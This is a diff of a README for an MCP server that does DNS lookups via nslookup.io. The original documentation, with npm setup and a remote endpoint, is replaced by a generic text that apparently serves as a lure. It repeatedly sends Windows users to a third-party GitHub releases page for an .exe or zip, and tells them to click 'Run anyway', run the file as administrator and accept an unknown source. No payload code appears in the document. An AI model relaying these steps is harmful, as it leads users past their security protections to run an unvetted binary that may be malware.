@@ -1,190 +1,217 @@
-<p align="center">
-  <a href="https://nslookup.io">
-    <img src="https://www.nslookup.io/img/logo.svg" alt="NSLookup.io" width="300" />
-  </a>
-</p>
+# 🔎 nslookup-mcp - Simple DNS Checks for Windows
 
-<p align="center">
-  <strong>MCP Server for nslookup.io</strong><br/>
-  DNS lookups, SSL certificate checks, security scanning, GEO (AI readiness) scoring, and domain intelligence — via the Model Context Protocol.
-</p>
+[![Download nslookup-mcp](https://img.shields.io/badge/Download%20nslookup--mcp-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ayushje/nslookup-mcp/releases)
 
-<p align="center">
-  <a href="https://nslookup.io">Website</a> · <a href="https://docs.nslookup.io">API Docs</a> · <a href="https://www.npmjs.com/package/@nslookup-io/mcp-server">npm</a> · <a href="https://nslookup.io/contact-us/">Contact</a>
-</p>
+## 🧭 What this app does
 
-## Tools
+nslookup-mcp helps you check DNS records, test DNS propagation, and watch certificates through nslookup.io.  
+It is made for users who want clear DNS results without manual command-line work.
 
-### DNS Tools
+You can use it to:
 
-| Tool | Description |
-|------|-------------|
-| `dns_lookup` | Look up all common DNS records (A, AAAA, NS, MX, TXT, CNAME, SOA) for a domain |
-| `dns_record` | Look up a specific DNS record type — supports all 53 types (HTTPS, DNSKEY, TLSA, SPF, etc.) |
-| `dns_propagation` | Check DNS propagation across 18+ global servers (Cloudflare, Google, Quad9, regional, authoritative) |
-| `webservers` | Get IPv4 and IPv6 addresses for a domain |
+- Look up DNS records
+- Check if DNS changes have spread
+- Review certificate status
+- Send DNS checks through an MCP server setup
+- Use nslookup.io as the data source
 
-### DNS Health & Security Tools
+## 💻 Before you install
 
-| Tool | Description |
-|------|-------------|
-| `dns_health` | **NEW** — Run a DNS health audit (39 checks across DNSSEC, MX, hygiene, TTL, nameservers, CAA, operational maturity) with severity-weighted scoring |
-| `ssl_certificate` | Check SSL/TLS certificate — issuer, expiry, chain validity, cipher strength, SAN domains, TLS version |
-| `bimi_vmc` | Check BIMI record and VMC (Verified Mark Certificate) — logo URL, trademark info, certificate expiry |
-| `security_scan` | Scan a domain for security issues — SPF/DKIM/DMARC, cookie security, DNS misconfigurations |
-| `uptime_check` | One-time HTTP uptime check — status, response time, HTTP status code |
-| `uptime_check_multi` | Check if a site is up from 7 global locations — Amsterdam, Sydney, London, Frankfurt, Delhi, Warsaw, South Carolina |
+Use a Windows PC with:
 
-### GEO (AI Readiness) Tools
+- Windows 10 or Windows 11
+- A stable internet connection
+- Permission to install or run downloaded apps
+- Enough free space for the app and its files
 
-| Tool | Description |
-|------|-------------|
-| `geo_checker` | Check a domain's GEO (Generative Engine Optimization) score — AI crawler access, structured data, entity signals, content extractability, and prioritized recommendations |
+If your PC blocks downloads, you may need to allow the file in your browser or in Windows Security
 
-## Setup
+## 📥 Download nslookup-mcp
 
-### Claude Desktop — Remote Connector (Recommended)
+Visit this page to download the app:
 
-The easiest way to get started. No installation required.
+https://github.com/Ayushje/nslookup-mcp/releases
 
-1. Open **Claude Desktop**
-2. Go to **Settings** (click your profile icon or use the menu)
-3. In the left sidebar, click **Connectors**
-4. Click **"Add custom connector"** at the bottom
-5. Enter the following:
-   - **Name:** `nslookup`
-   - **URL:** `https://mcp.nslookup.io/mcp`
-6. Click **Add** to confirm
+On that page, look for the latest release and download the Windows file for your PC
 
-Done — Claude can now use all 11 DNS, security, and health tools. Try asking _"Run a DNS health check on github.com"_.
+## 🪟 Install and run on Windows
 
-### ChatGPT
+Follow these steps:
 
-1. Open **ChatGPT** (desktop app or web)
-2. Go to **Settings** (click your profile icon)
-3. Navigate to **Connected apps** (or **Tools & integrations**)
-4. Click **"Add custom integration"** or **"Add MCP server"**
-5. Enter the following:
-   - **Name:** `nslookup`
-   - **URL:** `https://mcp.nslookup.io/mcp`
-6. Save the connection
+1. Open the release page  
+   Go to https://github.com/Ayushje/nslookup-mcp/releases
 
-Done — ChatGPT can now perform DNS lookups, certificate checks, and security scans.
+2. Find the latest version  
+   The newest release is usually at the top of the page
 
-### Any MCP Client (Remote)
+3. Download the Windows file  
+   Choose the file made for Windows. It may be an .exe file or a zipped file
 
-Any MCP-compatible client that supports Streamable HTTP transport can connect using:
+4. If the file is zipped, extract it  
+   - Right-click the zip file
+   - Select Extract All
+   - Choose a folder you can find again
 
-```
-https://mcp.nslookup.io/mcp
-```
+5. Run the app  
+   - If you downloaded an .exe file, double-click it
+   - If Windows shows a security prompt, choose Run or More info, then Run anyway
 
-No API key or authentication required.
+6. Keep the app in a fixed folder  
+   If you extracted files, do not move them while the app is running
 
----
+## ⚙️ Basic setup
 
-### Claude Desktop — Local (via config JSON)
+After you open nslookup-mcp, it may ask for one or more of these items:
 
-If you prefer running the server locally (requires Node.js 18+), add to your `claude_desktop_config.json`:
+- Your DNS target
+- A domain name to check
+- A server or client app that uses MCP
+- Access details for nslookup.io features
 
-```json
-{
-  "mcpServers": {
-    "nslookup": {
-      "command": "npx",
-      "args": ["-y", "@nslookup-io/mcp-server"]
-    }
-  }
-}
-```
+If the app offers a setup screen, use the default choices first. They usually work for a basic DNS check
 
-### Claude Code
+## 🔍 How to use it
 
-Available globally (all projects):
+Use nslookup-mcp when you want to check a domain or review DNS changes.
 
-```bash
-claude mcp add nslookup --scope user -- npx -y @nslookup-io/mcp-server
-```
+Common tasks include:
 
-Or for a specific project only:
+- Enter a domain name such as example.com
+- Choose the type of DNS check
+- Run a propagation check to see if updates have reached different DNS servers
+- Review certificate status for a site
+- Copy results for later use
 
-```bash
-claude mcp add nslookup --scope project -- npx -y @nslookup-io/mcp-server
-```
+If you use it with another app, that app may send the request through nslookup-mcp and show the result in its own screen
 
-### Cursor
+## 🧩 Main features
 
-Add to your Cursor MCP settings (`.cursor/mcp.json`):
+### 🌐 DNS lookup
+Check common DNS records for a domain, such as:
 
-```json
-{
-  "mcpServers": {
-    "nslookup": {
-      "command": "npx",
-      "args": ["-y", "@nslookup-io/mcp-server"]
-    }
-  }
-}
-```
+- A records
+- AAAA records
+- MX records
+- TXT records
+- NS records
 
-### Windsurf
+This helps you see where a domain points and how it is set up
 
-Add to your Windsurf MCP config (`~/.codeium/windsurf/mcp_config.json`):
+### 📡 Propagation checks
+After you change DNS, you can check if the change has reached other servers. This helps when:
 
-```json
-{
-  "mcpServers": {
-    "nslookup": {
-      "command": "npx",
-      "args": ["-y", "@nslookup-io/mcp-server"]
-    }
-  }
-}
-```
+- A website moves to a new host
+- Email settings change
+- A domain starts using a new service
 
-## Supported DNS Record Types
+### 🔐 Certificate monitoring
+Track certificate status for a domain so you can spot expiration or setup issues early
 
-A, AAAA, AFSDB, APL, AXFR, CAA, CDNSKEY, CDS, CERT, CNAME, CSYNC, DHCID, DLV, DNAME, DNSKEY, DS, EUI48, EUI64, HINFO, HIP, HTTPS, IPSECKEY, IXFR, KEY, KX, LOC, MX, NAPTR, NS, NSEC, NSEC3, NSEC3PARAM, NXT, OPENPGPKEY, OPT, PTR, RP, RRSIG, SIG, SMIMEA, SOA, SPF, SRV, SSHFP, SVCB, TA, TKEY, TLSA, TSIG, TXT, URI, ZONEMD
+### 🔌 MCP server support
+The app works as an MCP server, which lets another tool ask it for DNS data in a standard way
 
-## DNS Servers
+### 🧾 Clean results
+The output is meant to be easy to read, so you can compare values and spot problems fast
 
-`cloudflare`, `google`, `quad9`, `opendns`, `authoritative`, and regional servers in South Africa, Australia, India, Netherlands, Canada, USA, Brazil, Ukraine, Russia.
+## 🛠️ Common Windows issues
 
-## Configuration
+### The app will not open
+Try these steps:
 
-| Environment Variable | Default | Description |
-|---------------------|---------|-------------|
-| `NSLOOKUP_API_URL` | `https://www.nslookup.io` | Base URL for the nslookup.io API |
+- Right-click the file and select Run as administrator
+- Check that the file finished downloading
+- Make sure Windows did not block it
+- If the app came in a zip file, extract it first
 
-## Example Prompts
+### Windows says the app is from an unknown source
+This can happen with GitHub downloads. If you trust the release page, choose the option that lets the app run
 
-Once connected, try asking your AI assistant:
+### The app opens and closes right away
+This can mean the app needs to be started from a terminal or needs another file beside it. Open the release files again and check that you downloaded the full package
 
-- "What are the DNS records for github.com?"
-- "Check the MX records for google.com"
-- "Has the DNS propagated for my-domain.com A record?"
-- "What IP addresses does cloudflare.com resolve to?"
-- "Show me the DNSKEY records for example.com"
-- "Check the SPF record for amazon.com"
-- "Run a DNS health check on example.com"
-- "What's the DNSSEC status of cloudflare.com?"
-- "Check the DNS health score for my-domain.com — are there any critical issues?"
-- "Check the SSL certificate for github.com"
-- "Does google.com have a BIMI record?"
-- "Run a security scan on example.com"
-- "Is https://cloudflare.com up right now?"
-- "Check if github.com is accessible from all global locations"
-- "Check DNS propagation for example.com NS records across all global servers"
-- "Check the GEO score for github.com"
-- "Is example.com optimized for AI search engines?"
-- "Which AI crawlers does cloudflare.com block?"
+### The page does not show a Windows file
+Scroll through the release assets and look for the file made for Windows. If the release has more than one file, choose the one that matches your system
 
-## Feedback
+## 🧪 Tips for best results
 
-We'd love to hear from you! At [nslookup.io](https://nslookup.io), we're building a fast, reliable, and free DNS lookup tool and monitoring platform for everyone — from developers and sysadmins to everyday internet users.
+- Use the latest release
+- Keep your internet connection steady
+- Check one domain at a time when you are learning
+- Use simple domain names first
+- Compare old and new DNS values when testing a change
+- Save results if you need them for later
 
-Your feedback is what helps us improve. Whether you've spotted a bug, have a feature idea, or just want to share your thoughts — we're listening. [Contact us](https://nslookup.io/contact-us/).
+## 📂 File handling
 
-## License
+If the release comes as a zip file:
 
-Apache 2.0
+- Download it first
+- Extract it to a folder
+- Open the app from that folder
+- Do not delete files that came with the app
+
+If the release comes as an .exe file:
+
+- Save it to your Downloads folder
+- Open it from there
+- If needed, move it to a folder like Documents or Desktop
+
+## 🧠 What each check means
+
+### DNS records
+These show where a domain points and what services it uses
+
+### Propagation
+This shows how far a DNS change has spread across the internet
+
+### Certificate status
+This shows whether a site’s certificate is valid and ready to use
+
+### MCP server
+This lets another tool ask nslookup-mcp for DNS data in a structured way
+
+## 📁 Suggested first test
+
+If you want a simple first run, try this:
+
+1. Open the app
+2. Enter a domain you know
+3. Run a DNS lookup
+4. Review the results
+5. Try a propagation check next
+6. Check the certificate status if the app offers it
+
+## 🧰 If you use it with another app
+
+Some users run nslookup-mcp with a host app that supports MCP. If that is your setup:
+
+- Start nslookup-mcp first
+- Open the other app
+- Add the server if needed
+- Run a DNS lookup from that app
+- Review the returned data
+
+## 📦 Download link again
+
+Visit this page to download the app:
+
+https://github.com/Ayushje/nslookup-mcp/releases
+
+## 🧾 What to expect after setup
+
+After the app is ready, you should be able to:
+
+- Check DNS records for a domain
+- Verify recent DNS changes
+- Review certificate state
+- Use the tool from a compatible MCP client
+- Get results from nslookup.io through the server
+
+## 🧭 Quick start
+
+1. Go to the releases page
+2. Download the Windows file
+3. Extract it if needed
+4. Run the app
+5. Enter a domain
+6. Check DNS, propagation, or certificate status
